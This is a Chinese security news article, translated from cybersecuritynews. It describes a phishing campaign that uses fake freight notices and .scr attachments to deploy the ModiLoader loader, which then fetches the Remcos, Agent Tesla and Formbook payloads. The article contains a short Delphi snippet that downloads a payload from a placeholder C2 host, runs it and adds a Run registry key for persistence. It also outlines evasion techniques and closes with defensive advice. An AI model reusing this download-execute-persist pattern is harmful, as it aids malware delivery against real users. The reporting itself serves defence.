---
title: 恶意软件 ModiLoader 利用复杂钓鱼手段威胁企业信息安全
url: https://www.anquanke.com/post/id/306276
source: 安全客-有思想的安全新媒体
date: 2025-04-09
fetch_date: 2025-10-06T22:03:42.615970
---

# 恶意软件 ModiLoader 利用复杂钓鱼手段威胁企业信息安全

首页

阅读

* [安全资讯](https://www.anquanke.com/news)
* [安全知识](https://www.anquanke.com/knowledge)
* [安全工具](https://www.anquanke.com/tool)

活动

社区

学院

安全导航

内容精选

* [专栏](/column/index.html)
* [精选专题](https://www.anquanke.com/subject-list)
* [安全KER季刊](https://www.anquanke.com/discovery)
* [360网络安全周报](https://www.anquanke.com/week-list)

# 恶意软件 ModiLoader 利用复杂钓鱼手段威胁企业信息安全

阅读量**55437**

发布时间 : 2025-04-08 11:19:38

**x**

##### 译文声明

本文是翻译文章，文章原作者 Tushar Subhra Dutta，文章来源：cybersecuritynews

原文地址：<https://cybersecuritynews.com/threat-actors-weaponize-windows-screensavers-files-to-deliver-malware/>

译文仅供参考，具体内容表达以及含义原文为准。

恶意软件操作者利用 .scr 文件格式来分发恶意负载，他们借助这种文件在表面上看似无害的系统文件特性，实则利用其可执行的本质进行恶意活动。

网络安全研究人员近期观察到的攻击活动显示，攻击者采用了先进的策略，通过复杂的网络钓鱼计划来瞄准全球范围内的企业。

一个突出的例子是，攻击者冒充一家货运物流公司，传播 ModiLoader，这是一种长期存在的基于 Delphi 的恶意软件加载器，能够部署远程访问木马（RAT）和数据窃取程序。

Symantec 的Broadcom 分析师记录了在 2025 年 3 月至 4 月期间的一场持续攻击活动，在这次活动中，威胁行为者发送了模仿货运通知的电子邮件。

这些邮件提到了虚构的清关信息和国际货运内容，以此来增加可信度。

所附的 RAR 压缩文件中包含伪装成发票或装箱单的恶意.scr 文件，这引发了一系列事件，最终导致 ModiLoader 被部署。

该加载器随后会获取诸如 Remcos、Agent Tesla 和 Formbook 等二级恶意负载，使攻击者能够窃取凭据、监控按键操作，并建立持久的访问权限。

此次攻击的目标行业涵盖了工业机械制造、汽车、电子和广播等领域，涉及的地区包括日本、美国、以及东南亚。

这种地域和行业的多样性凸显了攻击者广泛的目标，从窃取知识产权到破坏企业运营。

****感染机制和技术执行过程****

攻击始于一封网络钓鱼邮件，邮件指示收件人查看一个附件 RAR 压缩文件。

压缩文件内包含一个.scr 文件，一旦解压，该文件就会执行 ModiLoader。

procedure TMainForm.Button1Click(Sender: TObject);begin

DownloadPayload(‘hxxp://malicious-c2[.]top/download/remcos.exe’);

ExecutePayload(‘%APPDATA%\remcos.exe’);

SetRegistryKey(‘HKCU\Software\Microsoft\Windows\CurrentVersion\Run’, ‘UpdateService’, ‘%APPDATA%\remcos.exe’);end;

ModiLoader 使用 HTTP GET 请求与命令控制（C2）服务器进行通信，下载经过加密的恶意负载，从而逃避基于签名的检测。

恶意软件使用进程空洞化技术，将这些恶意负载注入到诸如 explorer.exe 或 svchost.exe 等合法进程中，这种技术是用恶意代码替换可执行文件的内存段。

Symantec 的监测数据显示，该加载器进行了模块化更新，能够根据受害者的特征动态切换恶意负载。

为了对抗分析，.scr 文件会通过查询系统运行时间和已安装的安全软件来进行反沙盒检查。

如果未达到某些阈值，恶意软件就会进入睡眠循环或终止运行。一旦恶意软件激活，它会释放一个名为 “Invoice\_JN-032525C.pdf” 的诱饵文档，以维持其合法性的假象，同时在后台执行恶意操作。

Symantec 通过多层防御措施来应对这些威胁，包括启发式检测（Heur.AdvML.B）和静态分析规则（Trojan.Gen.MBT）。

建议企业在高风险环境中阻止.scr 文件的执行，并实施电子邮件附件沙盒化，以便在恶意负载部署之前拦截它们。

本文翻译自cybersecuritynews [原文链接](https://cybersecuritynews.com/threat-actors-weaponize-windows-screensavers-files-to-deliver-malware/)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由**安全客**原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处： [https://www.anquanke.com/post/id/306276](/post/id/306276)

安全KER - 有思想的安全新媒体

本文转载自: [cybersecuritynews](https://cybersecuritynews.com/threat-actors-weaponize-windows-screensavers-files-to-deliver-malware/)

如若转载,请注明出处： <https://cybersecuritynews.com/threat-actors-weaponize-windows-screensavers-files-to-deliver-malware/>

安全KER - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

* [网络攻击](/tag/%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB)

**+1**1赞

收藏

![](https://p5.ssl.qhimg.com/t010857340ce46bb672.jpg)安全客

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

## 发表评论

您还未登录，请先登录。

[登录](/login/index.html)

![](https://p1.ssl.qhimg.com/t014757b72460d855bf.png)

[![](https://p5.ssl.qhimg.com/t010857340ce46bb672.jpg)](/member.html?memberId=175868)

[安全客](/member.html?memberId=175868)

这个人太懒了，签名都懒得写一个

* 文章
* **376**

* 粉丝
* **1**

### TA的文章

* ##### [mavinject.exe 遭利用，黑客绕过安全防线入侵系统](/post/id/306961)

  2025-04-28 10:48:18
* ##### [Docker 惊现新型加密挖矿攻击，借 Teneo 平台开辟恶意获利新路径](/post/id/306959)

  2025-04-28 10:39:59
* ##### [Cloudflare 隧道遭滥用，恶意 RAT 传播威胁加剧](/post/id/306957)

  2025-04-28 10:34:35
* ##### [xrpl.js 库遭供应链攻击，超 290 万次下载用户私钥成窃取目标](/post/id/306953)

  2025-04-28 10:29:02
* ##### [恶意后门借 ViPNet 更新渗透，俄罗斯多行业数据安全拉响警报](/post/id/306951)

  2025-04-28 10:22:13

### 相关文章

* ##### [Morte僵尸网络被披露：正利用路由器与企业应用漏洞，迅速扩张其“加载器即服务”活动](/post/id/312444)

  2025-09-29 18:04:01
* ##### [Akira勒索软件利用SonicWall VPN账户发起急速入侵](/post/id/312438)

  2025-09-29 18:03:28
* ##### [DarkCloud信息窃取器现新变种：采用VB6混淆技术并新增加密货币钱包窃取功能，威胁显著升级](/post/id/312435)

  2025-09-29 18:02:53
* ##### [TamperedChef恶意软件兴起：欺诈应用利用经过签名的二进制文件与搜索引擎投毒劫持浏览器](/post/id/312432)

  2025-09-29 18:02:25
* ##### [黑客将SVG文件武器化，用于隐秘投递恶意负载](/post/id/312351)

  2025-09-24 16:44:10
* ##### [ShadowV2僵尸网络利用配置错误的AWS Docker容器构建DDoS攻击租用服务](/post/id/312381)

  2025-09-24 16:40:43
* ##### [npm软件包“fezbox”中被发现新型恶意软件，可利用二维码窃取用户凭据](/post/id/312387)

  2025-09-24 16:40:06

### 热门推荐

文章目录

![](https://p0.qhimg.com/t11098f6bcd5614af4bf21ef9b5.png)

安全KER

* [关于我们](/about)
* [联系我们](/note/contact)
* [用户协议](/note/protocol)
* [隐私协议](/note/privacy)

商务合作

* [合作内容](/note/business)
* [联系方式](/note/contact)
* [友情链接](/link)

内容需知

* [投稿须知](https://www.anquanke.com/contribute/tips)
* [转载须知](/note/repost)
* 官网QQ群：568681302

合作单位

* [![安全KER](https://p0.ssl.qhimg.com/t01592a959354157bc0.png)](http://www.cert.org.cn/)
* [![安全KER](https://p0.ssl.qhimg.com/t014f76fcea94035e47.png)](http://www.cnnvd.org.cn/)

Copyright © 北京奇虎科技有限公司 三六零数字安全科技集团有限公司 安全KER All Rights Reserved [京ICP备08010314号-66](https://beian.miit.gov.cn/)[![](https://icon.cnzz.com/img/pic.gif)](https://www.cnzz.com/stat/website.php?web_id=1271278035 "站长统计")

微信二维码

**X**![安全KER](https://p0.ssl.qhimg.com/t0151209205b47f2270.jpg)